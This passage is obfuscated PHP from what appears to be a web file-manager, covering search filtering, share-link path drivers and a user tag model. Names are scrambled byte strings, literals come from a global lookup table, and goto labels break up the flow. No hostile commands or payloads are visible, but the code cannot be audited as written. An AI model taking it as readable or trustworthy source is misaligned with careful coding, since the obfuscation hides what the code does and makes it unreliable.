(isset($¿€Òµ—à[$İ—×½ì¶[413]]) && $¿€Òµ—à[$İ—×½ì¶[413]]) { $õ¹İæØ = $¿€Òµ—à[$İ—×½ì¶[413]]; if ($õ¹İæØ == $İ—×½ì¶[89]) { $Ôä»¨Ç¨[$İ—×½ì¶[411]] = 1; } else { if ($õ¹İæØ == $İ—×½ì¶[2068]) { $Ôä»¨Ç¨[$İ—×½ì¶[411]] = 0; } else { if ($õ¹İæØ) { $õ¹İæØ = is_array($õ¹İæØ) ? $õ¹İæØ : explode($İ—×½ì¶[60], $õ¹İæØ); $Ôä»¨Ç¨[$İ—×½ì¶[413]] = array($İ—×½ì¶[419], $õ¹İæØ); $Ôä»¨Ç¨[$İ—×½ì¶[411]] = 0; } } } } $this->_parseSearchParent($¿€Òµ—à, $Ôä»¨Ç¨); if (isset($¿€Òµ—à[$İ—×½ì¶[1899]]) && trim($¿€Òµ—à[$İ—×½ì¶[1899]])) { $¤‡Ê°ê• = trim($¿€Òµ—à[$İ—×½ì¶[1899]]); $˜óÀ•à™ = explode($İ—×½ì¶[63], $¤‡Ê°ê•); if (strlen($¤‡Ê°ê•) > 2 && (substr($¤‡Ê°ê•, 0, 1) == $İ—×½ì¶[127] && substr($¤‡Ê°ê•, -1) == $İ—×½ì¶[127]) || substr($¤‡Ê°ê•, 0, 1) == $İ—×½ì¶[68] && substr($¤‡Ê°ê•, -1) == $İ—×½ì¶[68]) { $¤‡Ê°ê• = substr($¤‡Ê°ê•, 1, -1); $˜óÀ•à™ = array($¤‡Ê°ê•); } $Ôä»¨Ç¨[$İ—×½ì¶[42]] = array(array($İ—×½ì¶[544], $İ—×½ì¶[1901] . $¤‡Ê°ê• . $İ—×½ì¶[1901])); if (count($˜óÀ•à™) > 1) { $Ôä»¨Ç¨[$İ—×½ì¶[42]] = array(); foreach ($˜óÀ•à™ as $¥Ë¨ª€Ù) { if (!trim($¥Ë¨ª€Ù)) { continue; } $Ôä»¨Ç¨[$İ—×½ì¶[42]][] = array($İ—×½ì¶[544], $İ—×½ì¶[1901] . trim($¥Ë¨ª€Ù) . $İ—×½ì¶[1901]); } } } return $Ôä»¨Ç¨; } private function _parseSearchParent($¦Ğ²Ì‘, &$®ø³£ı) { $ÄÜüÜö„ =& $_SERVER[¹àö™Ç¾]; if (!isset($¦Ğ²Ì‘[$ÄÜüÜö„[498]]) || !$¦Ğ²Ì‘[$ÄÜüÜö„[498]]) { return; } $òôßãò˜ = $this->pathInfo($¦Ğ²Ì‘[$ÄÜüÜö„[498]]); $Å”ÑÁÌ = $òôßãò˜[$ÄÜüÜö„[498]] . $ÄÜüÜö„[22] === $ÄÜüÜö„[200]; $ØßÔ•Íô = $òôßãò˜[$ÄÜüÜö„[412]] == $ÄÜüÜö„[515]; $®ø³£ı[$ÄÜüÜö„[584]] = array($ÄÜüÜö„[544], $òôßãò˜[$ÄÜüÜö„[521]] . $¦Ğ²Ì‘[$ÄÜüÜö„[498]] . $ÄÜüÜö„[545]); $¤ï•»Ìª = isset($¦Ğ²Ì‘[$ÄÜüÜö„[1767]]) && in_array($ÄÜüÜö„[515], $¦Ğ²Ì‘[$ÄÜüÜö„[1767]]); if (!$¤ï•»Ìª || !$ØßÔ•Íô || !$Å”ÑÁÌ || !$òôßãò˜[$ÄÜüÜö„[414]]) { return; } if (!AuthModel::authCheckRoot($òôßãò˜[$ÄÜüÜö„[414]][$ÄÜüÜö„[415]])) { return; } $Ù®‘²óç = $òôßãò˜[$ÄÜüÜö„[504]] . $ÄÜüÜö„[22]; if ($Ù®‘²óç == $ÄÜüÜö„[99]) { unset($®ø³£ı[$ÄÜüÜö„[584]]); $®ø³£ı[$ÄÜüÜö„[412]] = self::TYPE_GROUP; return; } $î¨åƒêå = Model($ÄÜüÜö„[522])->groupChildrenAll($Ù®‘²óç); $Ğ†ö˜ïà = count($î¨åƒêå); if ($Ğ†ö˜ïà <= 1) { return; } $êô»…è = array($ÄÜüÜö„[498] => 0, $ÄÜüÜö„[412] => self::TYPE_GROUP, $ÄÜüÜö„[504] => array($ÄÜüÜö„[17], $î¨åƒêå)); $÷¾¥’³‰ = $this->field($ÄÜüÜö„[2069])->where($êô»…è)->limit($Ğ†ö˜ïà)->select(); $®ø³£ı[$ÄÜüÜö„[584]] = array(); foreach ($÷¾¥’³‰ as $ÚõÓß±) { $®ø³£ı[$ÄÜüÜö„[584]][] = array($ÄÜüÜö„[544], $ÄÜüÜö„[531] . $ÚõÓß±[$ÄÜüÜö„[403]] . $ÄÜüÜö„[545]); } $®ø³£ı[$ÄÜüÜö„[584]][] = $ÄÜüÜö„[1903]; } } goto Då¼ß¶¨¼; eõÓ“ÆšÃÍ: class PathDriverDriverShareItem { public function __construct($‘æîŸªØ) { $this->pathParse = $‘æîŸªØ; } public function __call($¨¦ŞØàó, $ÑŸëµÛì) { $™ÏñØ¥æ =& $_SERVER[¹àö™Ç¾]; if (method_exists($this, $¨¦ŞØàó)) { return; } $à ü÷ = call_user_func_array(array($™ÏñØ¥æ[1320], $¨¦ŞØàó), $ÑŸëµÛì); $²åŸê·ğ = array($™ÏñØ¥æ[1321], $™ÏñØ¥æ[1322], $™ÏñØ¥æ[1323], $™ÏñØ¥æ[1324], $™ÏñØ¥æ[549], $™ÏñØ¥æ[551], $™ÏñØ¥æ[1325], $™ÏñØ¥æ[118], $™ÏñØ¥æ[1326], $™ÏñØ¥æ[1327]); if (in_array($¨¦ŞØàó, $²åŸê·ğ)) { $à ü÷ = $this->getPathOuter($à ü÷); } return $à ü÷; } public function copy($ğÅİÚ”, $…â¼©áÌ, $˜è¿ÄÌÉ = false, $êàÀ “± = false) { return $this->copyMove($ğÅİÚ”, $…â¼©áÌ, $˜è¿ÄÌÉ, $_SERVER[¹àö™Ç¾][549], $êàÀ “±); } public function move($ïÏŸ‰Ç’, $˜‰Ìµ®, $›Å¹İËÕ = false, $Õˆ„ÔÕ¾ = false) { return $this->copyMove($ïÏŸ‰Ç’, $˜‰Ìµ®, $›Å¹İËÕ, $_SERVER[¹àö™Ç¾][551], $Õˆ„ÔÕ¾); } private function copyMove($‹œÛÓõ, $²Üº¥ÁÊ, $ƒ…£™úÆ, $…Ó¥É‹–, $Ñâ¸¾ï· = false) { $´“œÈ´Ğ =& $_SERVER[¹àö™Ç¾]; $ı±ôØğâ = $²Üº¥ÁÊ; $Õ§ş…ğõ = IO::driverMake($²Üº¥ÁÊ); if ($Õ§ş…ğõ->pathParse[$´“œÈ´Ğ[1136]]) { $²Üº¥ÁÊ = $Õ§ş…ğõ->pathParse[$´“œÈ´Ğ[1136]]; } else { $²Üº¥ÁÊ = $ı±ôØğâ; } $„¾şûçŠ = IO::copyMove($‹œÛÓõ, $²Üº¥ÁÊ, $ƒ…£™úÆ, $…Ó¥É‹–, $Ñâ¸¾ï·); $„¾şûçŠ = $this->getPathOuter($„¾şûçŠ); return $„¾şûçŠ; } public function pathThis($ŠïøÅ—¢) { return get_path_this($this->pathParse[$_SERVER[¹àö™Ç¾][88]]); } public function pathFather($•ö‡ÓŒ¶) { return get_path_father($this->pathParse[$_SERVER[¹àö™Ç¾][88]]); } public function iconvSystem($ ®Äòû) { return $ ®Äòû; } protected function infoParse($Âˆ³Ûéı, $À¢·ßŞé = false) { $º›–ïø¬ =& $_SERVER[¹àö™Ç¾]; $«Î‚ºÇ± = $this->pathParse[$º›–ïø¬[486]][$º›–ïø¬[1159]] . $this->pathParse[$º›–ïø¬[1152]]; if ($À¢·ßŞé) { $‚ÓÙúĞû = IO::infoWithChildren($«Î‚ºÇ±); } else { $‚ÓÙúĞû = IO::info($«Î‚ºÇ±); } $‹Ûôç÷² = $this->pathParse[$º›–ïø¬[486]]; return Action($º›–ïø¬[1318])->_shareItemeParse($‚ÓÙúĞû, $‹Ûôç÷²); } public function listAll($¯ä¤±±á) { $‘ŒñËş¸ =& $_SERVER[¹àö™Ç¾]; $ù—´Ş÷ê = IO::listAll($¯ä¤±±á); $¡ÔÖ±‘é = $this->pathParse[$‘ŒñËş¸[486]]; foreach ($ù—´Ş÷ê as &$ºˆ×ÊüÂ) { check_abort(); $êƒã°¼Ö = IO::info($ºˆ×ÊüÂ[$‘ŒñËş¸[88]]); $êƒã°¼Ö = is_array($êƒã°¼Ö) ? $êƒã°¼Ö : array(); $ºˆ×ÊüÂ = array_merge($êƒã°¼Ö, $ºˆ×ÊüÂ); $ºˆ×ÊüÂ[$‘ŒñËş¸[97]] = Action($‘ŒñËş¸[1318])->_shareItemeParse($ºˆ×ÊüÂ, $¡ÔÖ±‘é); } unset($ºˆ×ÊüÂ); return $ù—´Ş÷ê; } public function getPathOuter($÷Ô¯ûŞ) { $£ÒİÂ =& $_SERVER[¹àö™Ç¾]; $Ä¯ñ ñ˜ = KodIO::parse($÷Ô¯ûŞ); if ($Ä¯ñ ñ˜[$£ÒİÂ[43]] == KodIO::KOD_SHARE_ITEM) { return $Ä¯ñ ñ˜[$£ÒİÂ[88]]; } $Ë‹ßüìü = KodIO::clear($÷Ô¯ûŞ); $ú¶±ú—û = KodIO::clear($this->pathParse[$£ÒİÂ[486]][$£ÒİÂ[1159]]); $©ú²á® = substr($Ë‹ßüìü, strlen($ú¶±ú—û)); if (substr($Ë‹ßüìü, 0, strlen($ú¶±ú—û)) != $ú¶±ú—û) { return !1; } return $this->pathParse[$£ÒİÂ[1153]] . $£ÒİÂ[18] . ltrim($©ú²á®, $£ÒİÂ[18]); } public function getType() { $‚£ãøÁÛ =& $_SERVER[¹àö™Ç¾]; $õÉ¬Øñğ = str_replace($‚£ãøÁÛ[84], $‚£ãøÁÛ[22], get_class($this)); return strtolower($õÉ¬Øñğ); } public function isTypeObject($ñìàÏçò) { return IO::isTypeObject($ñìàÏçò); } public function info($ÇÚÜìó‹) { return $this->infoParse($ÇÚÜìó‹); } public function infoAuth($êí¢Í¬÷) { return $this->infoParse($êí¢Í¬÷); } public function infoWithChildren($¼ˆéÔ) { return $this->infoParse($¼ˆéÔ, !0); } public function infoFull($à‹Å°Øª) { return $this->infoParse($à‹Å°Øª); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ßıÍˆ¥€) { $this->pathParse = $ßıÍˆ¥€; } protected function infoParse($çÇÄõ¦Ô, $‹è÷Å½ = false) { $¦üÚé =& $_SERVER[¹àö™Ç¾]; return Action($¦üÚé[1158])->sharePathInfo($this->pathParse[$¦üÚé[88]], !0, $‹è÷Å½); } public function listPath($¡ÛûÄ¦”, $²×¥íÑ = false) { $ÍıİÜêô =& $_SERVER[¹àö™Ç¾]; $•­ = IO::listPath($¡ÛûÄ¦”, $²×¥íÑ); if (!$•­) { return $•­; } if (is_array($•­[$ÍıİÜêô[1319]])) { $›…àÌƒ = Action($ÍıİÜêô[1328])->parsePathChildren($•­[$ÍıİÜêô[1319]], array($ÍıİÜêô[422] => $¡ÛûÄ¦”)); $•­[$ÍıİÜêô[1319]] = Action($ÍıİÜêô[1158])->shareItemInfo($›…àÌƒ); } foreach ($•­ as $©óúŠğû => $ÃÆÎ›ºà) { if (!in_array($©óúŠğû, array($ÍıİÜêô[86], $ÍıİÜêô[87]))) { continue; } foreach ($ÃÆÎ›ºà as $¾¥è• ´ => $›…àÌƒ) { $›…àÌƒ = Action($ÍıİÜêô[1328])->parsePathChildren($›…àÌƒ, array($ÍıİÜêô[422] => $¡ÛûÄ¦”)); $•­[$©óúŠğû][$¾¥è• ´] = Action($ÍıİÜêô[1158])->shareItemInfo($›…àÌƒ); } } return $•­; } public function listAll($ñªúóÓÌ) { $‘·Óû† =& $_SERVER[¹àö™Ç¾]; $¢Ù‡âÌÁ = IO::listAll($ñªúóÓÌ); foreach ($¢Ù‡âÌÁ as &$ÂÄçá­Á) { $œŒ¸¨æİ = IO::info($ÂÄçá­Á[$‘·Óû†[88]]); $œŒ¸¨æİ = is_array($œŒ¸¨æİ) ? $œŒ¸¨æİ : array(); $ÂÄçá­Á = array_merge($œŒ¸¨æİ, $ÂÄçá­Á); $ÂÄçá­Á[$‘·Óû†[97]] = Action($‘·Óû†[1158])->shareItemInfo($ÂÄçá­Á); } unset($ÂÄçá­Á); return $¢Ù‡âÌÁ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($˜Õåî˜ª) { parent::__construct($˜Õåî˜ª); } } goto bÆÏ†¯ï; D³Â‘ìöÃÚ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($£¸‡é‡) { $öí—ø·§ =& $_SERVER[¹àö™Ç¾]; return array($öí—ø·§[1916] => array(USER_ID, $öí—ø·§[1917])); } protected function listData() { $â–ƒû±² =& $_SERVER[¹àö™Ç¾]; $ŸÛ¼ÓˆÈ = array($â–ƒû±²[1631] => USER_ID, $â–ƒû±²[483] => array($â–ƒû±²[1920], 0)); $¾™Ğ©í‡ = $â–ƒû±²[1922]; $Ğ¾ÔÑ©ı = $this->field($¾™Ğ©í‡)->where($ŸÛ¼ÓˆÈ)->order($â–ƒû±²[1923])->select(); return $Ğ¾ÔÑ©ı ? $Ğ¾ÔÑ©ı : array(); } protected function listByTag($×ŞÏ»ï«) { } protected function addToTag($É˜ÙÓÁ, $ŠÖ¶Á–) { $€¢¶ËÏä =& $_SERVER[¹àö™Ç¾]; if (!Model($€¢¶ËÏä[2057])->listData($ŠÖ¶Á–) || !Model($€¢¶ËÏä[817])->pathInfo($É˜ÙÓÁ)) { return !1; } $ìÛÍ®  = array($€¢¶ËÏä[1631] => USER_ID, $€¢¶ËÏä[483] => $ŠÖ¶Á–, $€¢¶ËÏä[422] => $É˜ÙÓÁ, $€¢¶ËÏä[423] => $€¢¶ËÏä[417], $€¢¶ËÏä[421] => $€¢¶ËÏä[22], $€¢¶ËÏä[1812] => 0); if ($this->where($ìÛÍ® )->find()) { return !1; } return $this->add($ìÛÍ® ); } protected function removeFromTag($´èêô°ö, $–Î‚ÁÊ) { $ãßÇ¹¥… =& $_SERVER[¹àö™Ç¾]; if (!Model($ãßÇ¹¥…[2057])->listData($–Î‚ÁÊ)) { return !1; } if (is_array($´èêô°ö)) { $´èêô°ö = array($ãßÇ¹¥…[17], $´èêô°ö); } $»ŞØÛ”Ë = array($ãßÇ¹¥…[1631] => USER_ID, $ãßÇ¹¥…[483] => $–Î‚ÁÊ, $ãßÇ¹¥…[423] => $ãßÇ¹¥…[417], $ãßÇ¹¥…[422] => $´èêô°ö); return $this->where($»ŞØÛ”Ë)->delete(); } protected function removeByTag($¥»òóºÙ) { $åÜßØİ– =& $_SERVER[¹àö™Ç¾]; if (!$¥»òóºÙ) { return !1; } $ÏÍ«èÍõ = array($åÜßØİ–[1631] => USER_ID, $åÜßØİ–[483] => $¥»òóºÙ); return $this->where($ÏÍ«èÍõ)->delete(); } protected function removeBySource($ÅÍ¦‘ú ) { $¨¥Á¸‘À =& $_SERVER[¹àö™Ç¾]; if (is_array($ÅÍ¦‘ú )) { $ÅÍ¦‘ú  = array($¨¥Á¸‘À[17], $ÅÍ¦‘ú ); } $§šË¤²ó = array($¨¥Á¸‘À[1631] => USER_ID, $¨¥Á¸‘À[422] => $ÅÍ¦‘ú , $¨¥Á¸‘À[483] => array($¨¥Á¸‘À[999], 0)); return $this->where($§šË¤²ó)->delete(); } }